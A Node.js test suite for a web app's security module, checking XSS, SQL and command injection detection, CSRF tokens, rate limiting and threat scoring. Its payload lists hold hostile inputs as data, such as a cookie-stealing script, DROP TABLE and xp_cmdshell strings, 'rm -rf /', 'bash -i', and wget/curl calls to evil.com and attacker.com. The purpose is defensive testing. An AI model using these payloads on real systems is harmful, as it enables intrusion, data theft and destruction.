#!/usr/bin/env node

/**
 * Comprehensive Security Test Suite
 * Tests all aspects of security implementation including:
 * - XSS and injection attack prevention
 * - CSRF protection
 * - Rate limiting and DDoS protection
 * - Input validation and sanitization
 * - Header security
 * - Authentication and authorization
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { performance } = require('perf_hooks');
const AdvancedSecurity = require('./lib/utils/advanced-security');

class ComprehensiveSecurityTester {
    constructor() {
        this.security = new AdvancedSecurity();
        this.testResults = [];
        this.vulnerabilityCount = 0;
        this.passedTests = 0;
        this.failedTests = 0;
    }

    log(message, type = 'info') {
        const timestamp = new Date().toISOString();
        const colors = {
            info: '\x1b[36m',
            success: '\x1b[32m',
            warning: '\x1b[33m',
            error: '\x1b[31m',
            security: '\x1b[35m',
            critical: '\x1b[41m'
        };
        
        console.log(`${colors[type] || ''}[${type.toUpperCase()}] ${message}\x1b[0m`);
        
        this.testResults.push({ timestamp, type, message });
    }

    /**
     * Test XSS attack prevention
     */
    async testXSSPrevention() {
        this.log('🛡️ Testing XSS attack prevention', 'security');
        
        const xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<svg onload="alert(1)">',
            '<body onload="alert(1)">',
            '"><script>alert("XSS")</script>',
            '<script>document.cookie="stolen=" + document.cookie</script>',
            '<object data="data:text/html,<script>alert(1)</script>"></object>',
            '<embed src="javascript:alert(1)">',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            '<style>@import"javascript:alert(1)";</style>'
        ];

        let blockedCount = 0;
        let passedCount = 0;

        for (const payload of xssPayloads) {
            const result = this.security.validateInput(payload, { htmlEncode: true });
            
            if (!result.isValid && result.threats.some(t => t.includes('XSS'))) {
                blockedCount++;
                this.log(`✓ Blocked XSS payload: ${payload.substring(0, 30)}...`, 'success');
            } else {
                passedCount++;
                this.log(`❌ XSS payload not detected: ${payload.substring(0, 30)}...`, 'error');
                this.vulnerabilityCount++;
            }
        }

        const effectiveness = (blockedCount / xssPayloads.length) * 100;
        this.log(`XSS Protection: ${effectiveness.toFixed(1)}% effective (${blockedCount}/${xssPayloads.length})`, 
                 effectiveness > 90 ? 'success' : effectiveness > 70 ? 'warning' : 'error');

        if (effectiveness > 90) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Test SQL injection prevention
     */
    async testSQLInjectionPrevention() {
        this.log('💉 Testing SQL injection prevention', 'security');
        
        const sqlPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "1; INSERT INTO users VALUES ('hacker', 'password')",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' AND SLEEP(5)--",
            "'; EXEC xp_cmdshell('dir')--"
        ];

        let blockedCount = 0;
        let passedCount = 0;

        for (const payload of sqlPayloads) {
            const result = this.security.validateInput(payload, { preventSql: true });
            
            if (!result.isValid && result.threats.some(t => t.includes('SQLINJECTION'))) {
                blockedCount++;
                this.log(`✓ Blocked SQL injection: ${payload.substring(0, 30)}...`, 'success');
            } else {
                passedCount++;
                this.log(`❌ SQL injection not detected: ${payload.substring(0, 30)}...`, 'error');
                this.vulnerabilityCount++;
            }
        }

        const effectiveness = (blockedCount / sqlPayloads.length) * 100;
        this.log(`SQL Injection Protection: ${effectiveness.toFixed(1)}% effective (${blockedCount}/${sqlPayloads.length})`, 
                 effectiveness > 90 ? 'success' : effectiveness > 70 ? 'warning' : 'error');

        if (effectiveness > 90) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Test command injection prevention
     */
    async testCommandInjectionPrevention() {
        this.log('⚡ Testing command injection prevention', 'security');
        
        const commandPayloads = [
            '; cat /etc/passwd',
            '| whoami',
            '& ls -la',
            '`id`',
            '$(uname -a)',
            '; rm -rf /',
            '| nc -l 1234',
            '; wget http://evil.com/malware',
            '& curl http://attacker.com',
            '; bash -i'
        ];

        let blockedCount = 0;
        let passedCount = 0;

        for (const payload of commandPayloads) {
            const result = this.security.validateInput(payload, { preventCommands: true });
            
            if (!result.isValid && result.threats.some(t => t.includes('COMMANDINJECTION'))) {
                blockedCount++;
                this.log(`✓ Blocked command injection: ${payload.substring(0, 30)}...`, 'success');
            } else {
                passedCount++;
                this.log(`❌ Command injection not detected: ${payload.substring(0, 30)}...`, 'error');
                this.vulnerabilityCount++;
            }
        }

        const effectiveness = (blockedCount / commandPayloads.length) * 100;
        this.log(`Command Injection Protection: ${effectiveness.toFixed(1)}% effective (${blockedCount}/${commandPayloads.length})`, 
                 effectiveness > 90 ? 'success' : effectiveness > 70 ? 'warning' : 'error');

        if (effectiveness > 90) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Test CSRF protection
     */
    async testCSRFProtection() {
        this.log('🔐 Testing CSRF protection', 'security');
        
        let csrfTestsPassed = 0;
        let csrfTestsTotal = 0;

        // Test token generation
        csrfTestsTotal++;
        const token1 = this.security.generateCSRFToken();
        const token2 = this.security.generateCSRFToken();
        
        if (token1 !== token2 && token1.length > 50 && token2.length > 50) {
            this.log('✓ CSRF token generation working correctly', 'success');
            csrfTestsPassed++;
        } else {
            this.log('❌ CSRF token generation failed', 'error');
            this.vulnerabilityCount++;
        }

        // Test valid token validation
        csrfTestsTotal++;
        const validToken = this.security.generateCSRFToken();
        if (this.security.validateCSRFToken(validToken)) {
            this.log('✓ Valid CSRF token accepted', 'success');
            csrfTestsPassed++;
        } else {
            this.log('❌ Valid CSRF token rejected', 'error');
            this.vulnerabilityCount++;
        }

        // Test invalid token rejection
        csrfTestsTotal++;
        const invalidTokens = [
            'invalid.token.here',
            '',
            'short',
            'too.many.parts.in.token.here',
            null,
            undefined
        ];

        let invalidRejected = 0;
        for (const invalidToken of invalidTokens) {
            if (!this.security.validateCSRFToken(invalidToken)) {
                invalidRejected++;
            }
        }

        if (invalidRejected === invalidTokens.length) {
            this.log('✓ All invalid CSRF tokens rejected', 'success');
            csrfTestsPassed++;
        } else {
            this.log(`❌ Some invalid CSRF tokens accepted: ${invalidTokens.length - invalidRejected}/${invalidTokens.length}`, 'error');
            this.vulnerabilityCount++;
        }

        // Test token expiration
        csrfTestsTotal++;
        // Simulate expired token by testing with very short maxAge
        const expiredToken = this.security.generateCSRFToken();
        await new Promise(resolve => setTimeout(resolve, 10)); // Wait 10ms
        
        if (!this.security.validateCSRFToken(expiredToken, 5)) { // 5ms maxAge
            this.log('✓ Expired CSRF token rejected', 'success');
            csrfTestsPassed++;
        } else {
            this.log('❌ Expired CSRF token accepted', 'error');
            this.vulnerabilityCount++;
        }

        const csrfEffectiveness = (csrfTestsPassed / csrfTestsTotal) * 100;
        this.log(`CSRF Protection: ${csrfEffectiveness.toFixed(1)}% effective (${csrfTestsPassed}/${csrfTestsTotal})`, 
                 csrfEffectiveness === 100 ? 'success' : csrfEffectiveness > 75 ? 'warning' : 'error');

        if (csrfEffectiveness === 100) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Test rate limiting effectiveness
     */
    async testRateLimiting() {
        this.log('⏱️ Testing rate limiting effectiveness', 'security');
        
        const testIP = '192.168.1.100';
        let allowedRequests = 0;
        let blockedRequests = 0;
        
        // Test normal rate limiting
        for (let i = 0; i < 50; i++) {
            const result = this.security.checkRateLimit(testIP, {
                maxRequests: 10,
                windowMs: 60000
            });
            
            if (result.allowed) {
                allowedRequests++;
            } else {
                blockedRequests++;
            }
        }

        this.log(`Rate limiting: ${allowedRequests} allowed, ${blockedRequests} blocked`, 'info');
        
        let rateLimitingPassed = 0;
        let rateLimitingTotal = 2;

        // Should allow some requests but block excess
        if (allowedRequests <= 10 && blockedRequests >= 30) {
            this.log('✓ Rate limiting working correctly', 'success');
            rateLimitingPassed++;
        } else {
            this.log('❌ Rate limiting not working as expected', 'error');
            this.vulnerabilityCount++;
        }

        // Test burst protection
        const burstIP = '192.168.1.101';
        let burstAllowed = 0;
        let burstBlocked = 0;

        // Rapid requests to test burst protection
        for (let i = 0; i < 15; i++) {
            const result = this.security.checkRateLimit(burstIP, {
                burstLimit: 5,
                burstWindowMs: 1000
            });
            
            if (result.allowed) {
                burstAllowed++;
            } else {
                burstBlocked++;
            }
        }

        if (burstAllowed <= 5 && burstBlocked >= 5) {
            this.log('✓ Burst protection working correctly', 'success');
            rateLimitingPassed++;
        } else {
            this.log('❌ Burst protection not working as expected', 'error');
            this.vulnerabilityCount++;
        }

        const rateLimitEffectiveness = (rateLimitingPassed / rateLimitingTotal) * 100;
        this.log(`Rate Limiting: ${rateLimitEffectiveness.toFixed(1)}% effective (${rateLimitingPassed}/${rateLimitingTotal})`, 
                 rateLimitEffectiveness === 100 ? 'success' : 'warning');

        if (rateLimitEffectiveness === 100) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Test input validation and sanitization
     */
    async testInputValidation() {
        this.log('🧹 Testing input validation and sanitization', 'security');
        
        const testCases = [
            {
                input: '<script>alert("test")</script>Normal text',
                expectSanitized: true,
                expectThreats: true,
                name: 'XSS in mixed content'
            },
            {
                input: 'Normal text without threats',
                expectSanitized: false,
                expectThreats: false,
                name: 'Clean text'
            },
            {
                input: '../../../etc/passwd',
                expectSanitized: true,
                expectThreats: true,
                name: 'Path traversal'
            },
            {
                input: 'SELECT * FROM users WHERE id = 1',
                expectSanitized: true,
                expectThreats: true,
                name: 'SQL query'
            },
            {
                input: 'A'.repeat(20000), // Very long input
                expectSanitized: true,
                expectThreats: true,
                name: 'Oversized input'
            }
        ];

        let validationPassed = 0;
        let validationTotal = testCases.length;

        for (const testCase of testCases) {
            const result = this.security.validateInput(testCase.input, { maxLength: 10000 });
            
            let passed = true;
            
            if (testCase.expectThreats && result.threats.length === 0) {
                this.log(`❌ ${testCase.name}: Expected threats but none detected`, 'error');
                passed = false;
            } else if (!testCase.expectThreats && result.threats.length > 0) {
                this.log(`❌ ${testCase.name}: Unexpected threats detected`, 'error');
                passed = false;
            }
            
            if (testCase.expectSanitized && result.sanitized === testCase.input) {
                this.log(`❌ ${testCase.name}: Expected sanitization but input unchanged`, 'error');
                passed = false;
            } else if (!testCase.expectSanitized && result.sanitized !== testCase.input) {
                this.log(`❌ ${testCase.name}: Unexpected sanitization occurred`, 'error');
                passed = false;
            }
            
            if (passed) {
                this.log(`✓ ${testCase.name}: Validation correct`, 'success');
                validationPassed++;
            } else {
                this.vulnerabilityCount++;
            }
        }

        const validationEffectiveness = (validationPassed / validationTotal) * 100;
        this.log(`Input Validation: ${validationEffectiveness.toFixed(1)}% effective (${validationPassed}/${validationTotal})`, 
                 validationEffectiveness === 100 ? 'success' : validationEffectiveness > 80 ? 'warning' : 'error');

        if (validationEffectiveness === 100) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Test threat analysis capabilities
     */
    async testThreatAnalysis() {
        this.log('🔍 Testing threat analysis capabilities', 'security');
        
        const mockRequests = [
            {
                headers: {
                    'user-agent': 'curl/7.68.0',
                    'x-forwarded-for': '192.168.1.200'
                },
                expectedRisk: 'medium'
            },
            {
                headers: {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'x-forwarded-for': '203.0.113.1'
                },
                expectedRisk: 'low'
            },
            {
                headers: {
                    'user-agent': 'sqlmap/1.0',
                    'x-forwarded-for': '10.0.0.1'
                },
                expectedRisk: 'high'
            }
        ];

        let analysisCorrect = 0;
        let analysisTotal = mockRequests.length;

        for (const request of mockRequests) {
            const analysis = this.security.analyzeThreat(request);
            
            if (analysis.riskLevel === request.expectedRisk || 
                (request.expectedRisk === 'high' && ['high', 'critical'].includes(analysis.riskLevel))) {
                this.log(`✓ Threat analysis correct for ${request.headers['user-agent'].substring(0, 20)}...`, 'success');
                analysisCorrect++;
            } else {
                this.log(`❌ Threat analysis incorrect: expected ${request.expectedRisk}, got ${analysis.riskLevel}`, 'error');
                this.vulnerabilityCount++;
            }
        }

        const analysisEffectiveness = (analysisCorrect / analysisTotal) * 100;
        this.log(`Threat Analysis: ${analysisEffectiveness.toFixed(1)}% accurate (${analysisCorrect}/${analysisTotal})`, 
                 analysisEffectiveness === 100 ? 'success' : analysisEffectiveness > 70 ? 'warning' : 'error');

        if (analysisEffectiveness === 100) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Test security event logging
     */
    async testSecurityEventLogging() {
        this.log('📝 Testing security event logging', 'security');
        
        // Generate some security events
        this.security.logSecurityEvent('test_event', { 
            riskLevel: 'high', 
            description: 'Test security event' 
        });
        
        this.security.logSecurityEvent('rate_limit_exceeded', { 
            identifier: '192.168.1.1', 
            riskScore: 25 
        });

        const stats = this.security.getSecurityStats();
        
        let loggingPassed = 0;
        let loggingTotal = 3;

        // Check if events were logged
        if (stats.totalEvents >= 2) {
            this.log('✓ Security events are being logged', 'success');
            loggingPassed++;
        } else {
            this.log('❌ Security events not being logged properly', 'error');
            this.vulnerabilityCount++;
        }

        // Check if event types are tracked
        if (stats.eventsByType['test_event'] && stats.eventsByType['rate_limit_exceeded']) {
            this.log('✓ Event types are being tracked', 'success');
            loggingPassed++;
        } else {
            this.log('❌ Event types not being tracked properly', 'error');
            this.vulnerabilityCount++;
        }

        // Check if risk levels are tracked
        if (stats.riskLevels && typeof stats.riskLevels === 'object') {
            this.log('✓ Risk levels are being tracked', 'success');
            loggingPassed++;
        } else {
            this.log('❌ Risk levels not being tracked properly', 'error');
            this.vulnerabilityCount++;
        }

        const loggingEffectiveness = (loggingPassed / loggingTotal) * 100;
        this.log(`Security Logging: ${loggingEffectiveness.toFixed(1)}% functional (${loggingPassed}/${loggingTotal})`, 
                 loggingEffectiveness === 100 ? 'success' : 'warning');

        if (loggingEffectiveness === 100) {
            this.passedTests++;
        } else {
            this.failedTests++;
        }
    }

    /**
     * Generate comprehensive security report
     */
    generateSecurityReport() {
        this.log('\n🛡️ COMPREHENSIVE SECURITY ASSESSMENT REPORT', 'security');
        this.log('=' .repeat(70), 'info');
        
        const totalTests = this.passedTests + this.failedTests;
        const successRate = totalTests > 0 ? (this.passedTests / totalTests) * 100 : 0;
        
        this.log(`\n📊 SECURITY TEST SUMMARY:`, 'info');
        this.log(`- Total Test Categories: ${totalTests}`, 'info');
        this.log(`- Tests Passed: ${this.passedTests}`, 'success');
        this.log(`- Tests Failed: ${this.failedTests}`, this.failedTests > 0 ? 'error' : 'info');
        this.log(`- Success Rate: ${successRate.toFixed(1)}%`, successRate >= 90 ? 'success' : successRate >= 70 ? 'warning' : 'error');
        this.log(`- Vulnerabilities Found: ${this.vulnerabilityCount}`, this.vulnerabilityCount === 0 ? 'success' : 'error');

        this.log(`\n🎯 SECURITY POSTURE ASSESSMENT:`, 'info');
        
        if (this.vulnerabilityCount === 0 && successRate === 100) {
            this.log('🟢 EXCELLENT SECURITY POSTURE', 'success');
            this.log('✅ All security tests passed', 'success');
            this.log('✅ No vulnerabilities detected', 'success');
            this.log('✅ System ready for production', 'success');
        } else if (this.vulnerabilityCount <= 2 && successRate >= 90) {
            this.log('🟡 GOOD SECURITY POSTURE', 'warning');
            this.log('⚠️  Minor security improvements needed', 'warning');
            this.log('✅ Generally secure for production', 'success');
        } else if (this.vulnerabilityCount <= 5 && successRate >= 70) {
            this.log('🟠 MODERATE SECURITY POSTURE', 'warning');
            this.log('⚠️  Several security improvements needed', 'warning');
            this.log('🔧 Address issues before production', 'warning');
        } else {
            this.log('🔴 POOR SECURITY POSTURE', 'error');
            this.log('❌ Significant security vulnerabilities', 'error');
            this.log('🚫 NOT READY for production', 'critical');
        }

        this.log(`\n🔧 SECURITY RECOMMENDATIONS:`, 'info');
        
        if (this.vulnerabilityCount === 0) {
            this.log('✅ Continue regular security audits', 'info');
            this.log('✅ Keep security libraries updated', 'info');
            this.log('✅ Monitor security logs regularly', 'info');
        } else {
            this.log('🔧 Address identified vulnerabilities immediately', 'warning');
            this.log('🔧 Implement additional input validation', 'warning');
            this.log('🔧 Enhance rate limiting mechanisms', 'warning');
            this.log('🔧 Review and strengthen authentication', 'warning');
        }

        // Get security statistics
        const securityStats = this.security.getSecurityStats();
        this.log(`\n📈 SECURITY ACTIVITY STATISTICS:`, 'info');
        this.log(`- Total Security Events: ${securityStats.totalEvents}`, 'info');
        this.log(`- Event Types: ${Object.keys(securityStats.eventsByType).length}`, 'info');
        this.log(`- High/Critical Risk Events: ${securityStats.riskLevels.high + securityStats.riskLevels.critical}`, 'info');

        const overallScore = this.calculateOverallSecurityScore(successRate, this.vulnerabilityCount);
        this.log(`\n🎯 OVERALL SECURITY SCORE: ${overallScore}/100`, 
                 overallScore >= 90 ? 'success' : overallScore >= 70 ? 'warning' : 'error');

        return {
            totalTests,
            passedTests: this.passedTests,
            failedTests: this.failedTests,
            successRate,
            vulnerabilityCount: this.vulnerabilityCount,
            overallScore,
            securityStats,
            testResults: this.testResults
        };
    }

    /**
     * Calculate overall security score
     * @param {number} successRate - Test success rate
     * @param {number} vulnerabilities - Number of vulnerabilities
     * @returns {number} Overall security score
     */
    calculateOverallSecurityScore(successRate, vulnerabilities) {
        let score = successRate;
        
        // Deduct points for vulnerabilities
        score -= vulnerabilities * 5;
        
        // Bonus points for comprehensive testing
        if (this.passedTests >= 6) {
            score += 10;
        }
        
        return Math.max(0, Math.min(100, Math.round(score)));
    }

    /**
     * Run all security tests
     */
    async runAllTests() {
        this.log('🚀 Starting Comprehensive Security Test Suite', 'security');
        this.log('Testing all security measures and protections...', 'info');
        
        try {
            await this.testXSSPrevention();
            await this.testSQLInjectionPrevention();
            await this.testCommandInjectionPrevention();
            await this.testCSRFProtection();
            await this.testRateLimiting();
            await this.testInputValidation();
            await this.testThreatAnalysis();
            await this.testSecurityEventLogging();
            
            return this.generateSecurityReport();
            
        } catch (error) {
            this.log(`Security test suite failed: ${error.message}`, 'critical');
            throw error;
        }
    }
}

// Run tests if called directly
if (require.main === module) {
    const tester = new ComprehensiveSecurityTester();
    
    tester.runAllTests()
        .then(report => {
            console.log('\n✅ Comprehensive security testing completed');
            
            // Save report to file
            const reportPath = path.join(__dirname, 'security-test-report.json');
            fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
            console.log(`📄 Security report saved to: ${reportPath}`);
            
            process.exit(report.vulnerabilityCount > 0 ? 1 : 0);
        })
        .catch(error => {
            console.error('❌ Security testing failed:', error.message);
            process.exit(1);
        });
}

module.exports = ComprehensiveSecurityTester;